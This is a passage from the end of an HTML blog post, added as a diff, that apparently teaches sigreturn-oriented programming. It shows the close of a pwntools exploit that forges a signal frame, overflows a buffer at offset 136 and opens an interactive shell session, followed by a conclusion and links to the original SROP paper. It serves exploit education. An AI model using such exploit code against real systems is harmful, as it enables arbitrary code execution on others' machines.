+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># err</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># trapno</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xe</span><span class="p">)</span> <span class="c1"># reserved</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># uc_sigmask</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">offset</span><span class="o">=</span><span class="mi">136</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">sigframe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>In summary, sigreturn oriented programming is a technique typically used to populate
+registers for the goal of arbitrary code execution by forging a runtime signal frame
+and exploiting the signal handling mechanism on Unix based systems.</p>
+<p>Below is a list of additional resources which I used as a reference while writing this
+post, I highly recommend going through the original paper on this technique.</p>
+<p>Thanks for reading!</p>
+<h2 id="additional-resources">Additional Resources</h2>
+<pre tabindex="0"><code>https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf
+https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf
+https://en.wikipedia.org/wiki/Sigreturn-oriented_programming
+https://lwn.net/Articles/676803/
+</code></pre>
+            </div>
+        </article>
+    </main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/intranautic" target="_blank" rel="noopener noreferrer me" title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com/intranautic" target="_blank" rel="noopener noreferrer me" title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="https://keybase.io/intranautic" target="_blank" rel="noopener noreferrer me" title="Keybase">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 71 76.3" version="1.1" fill="currentColor" stroke="none">
+    <path
+        d="M6.68 73.99c-.6-1.3-1.4-3.1-1.8-4l-.6-1.7-2 2.2-2 2.2-.2-4.2c-.3-6 .2-12.2 1.2-16.6 2.3-9.8 9.5-18.7 18.8-23.4l2.1-1-.5-1.5c-.3-.8-.6-2.5-.7-3.6l-.2-2.1-2.1-.2c-3.2-.3-4.9-1.2-6-3.5-.6-1.2-.6-1.4-.4-4.6.2-4.2.5-5.1 1.8-6.5 1.6-1.8 2.7-2.1 6.7-1.9 2.9.2 3.5.3 4.8.9.8.4 1.5.8 1.6.8.1 0 1-1.1 2.1-2.6l1.9-2.7 1.2.7c.7.4 1.5.9 1.9 1.1l.7.4-.6 1.5c-.3.8-.7 2.2-.8 2.9l-.2 1.4 1.7.2c6.1.6 10.7 4.3 12.4 9.9.5 1.8.5 5.3 0 7-.5 1.6-.5 1.7-.1 1.7.7 0 5.4 2.3 7.3 3.5 3.7 2.4 8 6.6 10.4 10.2 4.5 6.7 6.4 14 5.6 22-.4 4.8-1.3 8.6-2.9 12.3l-.6 1.4h-5l1.2-2.4c1.3-2.6 2.3-6.2 2.8-9.4.3-2.2.4-8.2.1-9.3l-.2-.7-1.3 1.4c-3.2 3.5-7.9 4.5-14.2 2.8-5.4-1.4-7.6-1.7-12.7-1.7-3.9 0-5.2.1-7.3.6-5.8 1.3-9.9 3.2-15.6 7.3-2.1 1.5-3.8 2.7-3.9 2.7-.1 0 .2-1 .6-2.3.4-1.3 1.1-3.4 1.5-4.8l.8-2.5-.9.9c-.5.5-1.9 1.9-3.1 3.2l-2.1 2.3.5 1.9c.6 2.5 2 5.6 3.5 7.9.6 1 1.1 1.8 1.1 1.9s-1.2.1-2.6.1h-2.6l-1.1-2.1zm8.8-24.2c4.8-5.1 8.7-9.2 8.8-9.2.1.1-.4 1.6-.9 3.3-3.3 10.4-4 12.4-3.9 12.5 0 0 1.2-.4 2.5-.9 8.5-3.7 18.4-4.2 28.9-1.4 4.7 1.2 6.5 1.2 8.8 0 1.3-.7 1.8-1.1 2.4-2.1 1.1-1.7 1.2-4.1.5-6.3-1.7-4.8-8.3-11-14.5-13.7-3.2-1.4-3.4-1.4-4.1-.7l-.6.6 2.6 3.2c1.4 1.7 2.9 3.6 3.1 4.1.6 1.2.7 3.1.1 4.3-.8 1.7-3.2 2.9-5.1 2.5-.8-.2-1.1-.1-1.9.5-2.2 1.6-4.6 1.2-6.6-1.2-1.6-1.8-2-2.7-2.1-4.5 0-.9-.3-2-.5-2.4-.3-.6-.4-1.3-.4-2.2l.1-1.4-1.3-.3c-1.8-.5-3.9-1.5-5.1-2.4-.6-.4-1.1-.8-1.3-.8s-1.5.6-2.9 1.3c-9.7 5-16 14.3-17 24.8-.1 1-.2 2.3-.3 2.8l-.1.9 1.1-1.1c.5-.5 4.9-5.1 9.7-10.2zm25.9-7.4c.9-.7 1.7-1.3 1.9-1.3.1 0 .4.3.7.7.5.8 1.4.8 1.8.1.3-.5.3-.6-5.6-7.8-3.5-4.3-4.2-5-4.7-5-1.2.1-.9 1 1 3.3l1.8 2.2-1 .8c-1.1 1-1.2 1.2-.5 1.8.5.5.6.4 1.6-.3l1.1-.7.7.6c.4.3.6.8.6.9 0 .2-.8.9-1.7 1.7-.9.7-1.6 1.5-1.6 1.7 0 .3.5 1.1 1.4 2.2.3.6.8.4 2.5-.9zm-10.3-14.2c.6-1.8 2.6-3.2 4.6-3.2 1.1 0 2.7.9 3.8 2.1l1 1.2.9-1.1c2.5-2.8 2.8-6.7.8-10.1-1.5-2.5-4.3-4-8.2-4.4-2.1-.2-2.6-.4-3.7-1.5l-.8-.8-.4.6c-.8 1.2-2.5 5.1-3 6.6-.7 2.3-.4 5.9.5 7.7.9 1.7 3.3 4 4 3.7.1.1.3-.3.5-.8zm-8.9-13.6c.2-.5.7-1.8 1.2-2.8.5-1 .9-2 .9-2.3 0-.9-1-1.3-3.7-1.5-2.4-.2-2.6-.1-3.1.4-.4.4-.6.9-.6 1.6 0 .6-.1 1.7-.2 2.6-.2 2.1.1 2.5 2.2 2.8 3.1.2 3 .2 3.3-.8zm-3.1-2.4c0-1.7.2-1.9 1.6-1.9h1.3v2.8h-2.8v-.9zm6.3 58.3c-.6-.6-.8-1-.8-2 0-1.9 1.1-3 2.9-3 1.7 0 2.9 1.2 2.9 2.9 0 1.8-1.1 2.8-3 2.9-1 0-1.4-.2-2-.8zm19.3.3a2.93 2.93 0 011.8-5.3c1.8 0 2.8 1.1 2.9 3 0 1.1-.1 1.4-.8 2s-1 .8-2 .8c-.9 0-1.5-.2-1.9-.5z" />
+</svg>
+</a>
+<a href="mailto:intranautic@gmail.com" target="_blank" rel="noopener noreferrer me" title="Email">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 21" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+    <polyline points="22,6 12,13 2,6"></polyline>
+</svg>
+</a>
+<a href="/pgp.txt" target="_blank" rel="noopener noreferrer me" title="Pgp">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+</a>
+<a href="/index.xml" target="_blank" rel="noopener noreferrer me" title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a></div>
+    <small class="footer_copyright">
+        © 2023 Intranautic.
+    </small>
+</footer>
+
+<script src="https://intranautic.com/js/themeSwitchnMenu.min.2a402288242b6930b175a0722c267e2353055739b3975834df35e56d00dd8f50.js"></script></body>
+</html>
